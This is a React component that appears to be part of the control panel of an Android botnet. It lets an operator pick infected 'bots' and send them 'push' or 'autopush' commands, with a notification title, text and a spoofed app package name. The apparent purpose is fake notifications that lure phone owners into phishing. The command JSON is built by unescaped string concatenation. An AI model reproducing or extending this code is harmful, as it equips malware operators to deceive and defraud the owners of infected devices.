import { useContext, useState } from 'react';
import { Button, Input, notification } from "antd"
import { BotContext } from '../providers';
import { setCommand } from '../services';
import { ServerResponseType } from '../../../common/DataType';

export default () => {
  const { state, setState } = useContext(BotContext)
  const [title, setTitle] = useState('')
  const [text, setText] = useState('')
  const [app, setApp] = useState('')

  const autoPush = () => {
    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"autopush"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
    })
  }

  const sendPush = () => {
    if (app == '' || title == '' || text == '') {
      notification['error']({
        message: 'ERROR',
        description: 'Please fill the inputs.'
      })

      return
    }

    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"push","app":"' + app + '","title":"' + title + '","text":"' + text + '"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
    })
  }

  return (
    <div className="pb-6">
      <h2 className="text-xl">Send push</h2>
      <p className="text-stone-500">Send push to selected bots</p>
      <Input placeholder="Push title" className="!mb-2" value={title} onChange={(e: any) => setTitle(e.target.value)}/>
      <Input placeholder="Push text" className="!mb-2" value={text} onChange={(e: any) => setText(e.target.value)}/>
      <Input placeholder="com.android.push.app.name" value={app} className="!mb-2" onChange={(e: any) => setApp(e.target.value)}/>
      <Button ghost type="primary" className="float-left" onClick={autoPush}>Auto Push</Button>
      <Button ghost type="primary" className="float-right" onClick={sendPush}>Send Push</Button>
    </div>
  )
}